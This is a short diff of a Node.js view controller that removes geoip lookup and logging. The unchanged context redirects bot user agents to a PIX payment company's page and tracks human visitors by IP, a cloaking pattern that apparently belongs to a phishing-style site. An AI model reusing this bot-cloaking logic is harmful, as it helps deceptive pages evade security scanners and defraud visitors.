@@ -2,7 +2,6 @@ const Client = require('../../models/Client')
 const isbot = require('isbot')
 const Visitor = require('../../models/visitor')
 const Robots = require('../../modules/Robots')
-const { lookup } = require('geoip-lite')
 
 module.exports = {
     async view(req, res) {
@@ -12,8 +11,6 @@ module.exports = {
             if (isbot(req.get('user-agent'))) return res.redirect('https://www.stone.com.br/pix/')
 
             const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress
-
-            console.log(lookup(ip))
 
             const visitor = await Visitor.findOne({ where: { ip } })
 
